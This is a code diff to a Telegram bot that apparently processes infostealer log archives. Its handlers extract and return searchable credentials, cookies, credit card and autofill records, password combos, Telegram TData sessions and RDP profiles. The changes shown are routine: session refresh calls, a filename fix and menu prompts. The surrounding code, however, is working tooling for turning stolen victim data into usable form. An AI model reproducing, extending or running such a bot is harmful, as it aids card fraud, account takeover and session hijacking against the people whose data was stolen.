@@ -55,9 +55,14 @@ async def send_file_safely(message: Message, file_path: Path, caption: str, file
         delivery_file = temp_zip
         caption += " <i>(Compressed to ZIP)</i>"
 
+    if temp_zip and filename_override and not filename_override.endswith(".zip"):
+        final_filename = Path(filename_override).stem + ".zip"
+    else:
+        final_filename = filename_override or delivery_file.name
+
     try:
         await message.answer_document(
-            document=FSInputFile(str(delivery_file), filename=filename_override or delivery_file.name),
+            document=FSInputFile(str(delivery_file), filename=final_filename),
             caption=caption,
             parse_mode="HTML"
         )
@@ -288,6 +293,7 @@ async def action_search_callback(query: CallbackQuery, state: FSMContext):
         await query.answer("⚠️ No active archive loaded.", show_alert=True)
         return
 
+    touch_session(session_dir)
     await state.set_state(BotState.waiting_for_keyword)
     await query.message.answer(
         "🔍 <b>Keyword / Domain Search:</b>\n\n"
@@ -310,6 +316,7 @@ async def process_keyword_search(message: Message, state: FSMContext):
         await message.answer("⚠️ Session expired. Please re-send the archive.")
         return
 
+    touch_session(session_dir)
     status_msg = await message.answer(f"🔎 <b>Searching credentials for:</b> <code>{keyword}</code>...", parse_mode="HTML")
 
     loop = asyncio.get_running_loop()
@@ -334,7 +341,7 @@ async def process_keyword_search(message: Message, state: FSMContext):
         caption=f"🎯 <b>Found {total_found} entries for:</b> <code>{keyword}</code>",
         filename_override=f"results_{keyword}.txt"
     )
-    await message.answer("Select another action:", reply_markup=session_action_keyboard())
+    await message.answer("⚡ <b>Choose next operation:</b>", reply_markup=session_action_keyboard(), parse_mode="HTML")
 
 @router.callback_query(F.data == "action_cookies")
 async def action_cookies_callback(query: CallbackQuery):
@@ -343,6 +350,7 @@ async def action_cookies_callback(query: CallbackQuery):
         await query.answer("⚠️ No active archive loaded.", show_alert=True)
         return
 
+    touch_session(session_dir)
     status_msg = await query.message.answer("🍪 <b>Aggregating cookies across all logs...</b>", parse_mode="HTML")
     out_file = OUTPUT_DIR / f"cookies_{query.from_user.id}.txt"
 
@@ -352,6 +360,7 @@ async def action_cookies_callback(query: CallbackQuery):
     if file_count == 0 or total_lines == 0:
         await status_msg.edit_text("⚠️ No cookie records found in this archive.")
         out_file.unlink(missing_ok=True)
+        await query.message.answer("⚡ <b>Choose next operation:</b>", reply_markup=session_action_keyboard(), parse_mode="HTML")
         await query.answer()
         return
 
@@ -362,6 +371,7 @@ async def action_cookies_callback(query: CallbackQuery):
         caption=f"🍪 <b>Collected {total_lines:,} cookie lines from {file_count} log sources!</b>",
         filename_override="all_cookies.txt"
     )
+    await query.message.answer("⚡ <b>Choose next operation:</b>", reply_markup=session_action_keyboard(), parse_mode="HTML")
     await query.answer()
 
 @router.callback_query(F.data == "action_cards")
@@ -371,6 +381,7 @@ async def action_cards_callback(query: CallbackQuery):
         await query.answer("⚠️ No active archive loaded.", show_alert=True)
         return
 
+    touch_session(session_dir)
     status_msg = await query.message.answer("💳 <b>Deep scanning for credit cards & autofill...</b>", parse_mode="HTML")
     out_file = OUTPUT_DIR / f"cards_{query.from_user.id}.txt"
 
@@ -380,6 +391,7 @@ async def action_cards_callback(query: CallbackQuery):
     if total_cards == 0:
         await status_msg.edit_text("⚠️ No credit card or autofill records found.")
         out_file.unlink(missing_ok=True)
+        await query.message.answer("⚡ <b>Choose next operation:</b>", reply_markup=session_action_keyboard(), parse_mode="HTML")
         await query.answer()
         return
 
@@ -390,6 +402,7 @@ async def action_cards_callback(query: CallbackQuery):
         caption=f"💳 <b>Extracted {total_cards:,} unique credit cards from {files_with_cards} files!</b>",
         filename_override="cards_autofill.txt"
     )
+    await query.message.answer("⚡ <b>Choose next operation:</b>", reply_markup=session_action_keyboard(), parse_mode="HTML")
     await query.answer()
 
 @router.callback_query(F.data == "action_passwords")
@@ -399,6 +412,7 @@ async def action_passwords_callback(query: CallbackQuery):
         await query.answer("⚠️ No active archive loaded.", show_alert=True)
         return
 
+    touch_session(session_dir)
     status_msg = await query.message.answer("🔑 <b>Compiling passwords & combos...</b>", parse_mode="HTML")
     out_file = OUTPUT_DIR / f"all_passwords_{query.from_user.id}.txt"
 
@@ -408,6 +422,7 @@ async def action_passwords_callback(query: CallbackQuery):
     if count == 0:
         await status_msg.edit_text("⚠️ No password logs found.")
         out_file.unlink(missing_ok=True)
+        await query.message.answer("⚡ <b>Choose next operation:</b>", reply_markup=session_action_keyboard(), parse_mode="HTML")
         await query.answer()
         return
 
@@ -418,6 +433,7 @@ async def action_passwords_callback(query: CallbackQuery):
         caption=f"🔑 <b>Compiled from {count} password files!</b>",
         filename_override="all_passwords.txt"
     )
+    await query.message.answer("⚡ <b>Choose next operation:</b>", reply_markup=session_action_keyboard(), parse_mode="HTML")
     await query.answer()
 
 @router.callback_query(F.data == "action_tdata")
@@ -427,6 +443,7 @@ async def action_tdata_callback(query: CallbackQuery):
         await query.answer("⚠️ No active archive loaded.", show_alert=True)
         return
 
+    touch_session(session_dir)
     status_msg = await query.message.answer("✈️ <b>Packaging TData sessions...</b>", parse_mode="HTML")
     out_zip = OUTPUT_DIR / f"tdata_{query.from_user.id}.zip"
 
@@ -436,6 +453,7 @@ async def action_tdata_callback(query: CallbackQuery):
     if count == 0:
         await status_msg.edit_text("⚠️ No TData folders found.")
         out_zip.unlink(missing_ok=True)
+        await query.message.answer("⚡ <b>Choose next operation:</b>", reply_markup=session_action_keyboard(), parse_mode="HTML")
         await query.answer()
         return
 
@@ -446,6 +464,7 @@ async def action_tdata_callback(query: CallbackQuery):
         caption=f"✈️ <b>Extracted {count} TData session folders!</b>",
         filename_override="tdata_sessions.zip"
     )
+    await query.message.answer("⚡ <b>Choose next operation:</b>", reply_markup=session_action_keyboard(), parse_mode="HTML")
     await query.answer()
 
 @router.callback_query(F.data == "action_rdp")
@@ -455,6 +474,7 @@ async def action_rdp_callback(query: CallbackQuery):
         await query.answer("⚠️ No active archive loaded.", show_alert=True)
         return
 
+    touch_session(session_dir)
     status_msg = await query.message.answer("🖥️ <b>Packaging RDP profiles...</b>", parse_mode="HTML")
     out_zip = OUTPUT_DIR / f"rdp_{query.from_user.id}.zip"
 
@@ -464,6 +484,7 @@ async def action_rdp_callback(query: CallbackQuery):
     if count == 0:
         await status_msg.edit_text("⚠️ No RDP profiles found.")
         out_zip.unlink(missing_ok=True)
+        await query.message.answer("⚡ <b>Choose next operation:</b>", reply_markup=session_action_keyboard(), parse_mode="HTML")
         await query.answer()
         return
 
@@ -474,6 +495,7 @@ async def action_rdp_callback(query: CallbackQuery):
         caption=f"🖥️ <b>Extracted {count} RDP profiles!</b>",
         filename_override="rdp_profiles.zip"
     )
+    await query.message.answer("⚡ <b>Choose next operation:</b>", reply_markup=session_action_keyboard(), parse_mode="HTML")
     await query.answer()
 
 @router.callback_query(F.data == "action_stats")
@@ -483,6 +505,7 @@ async def action_stats_callback(query: CallbackQuery):
         await query.answer("⚠️ No active archive loaded.", show_alert=True)
         return
 
+    touch_session(session_dir)
     loop = asyncio.get_running_loop()
     stats = await loop.run_in_executor(None, scan_session_stats, session_dir)
     text = (
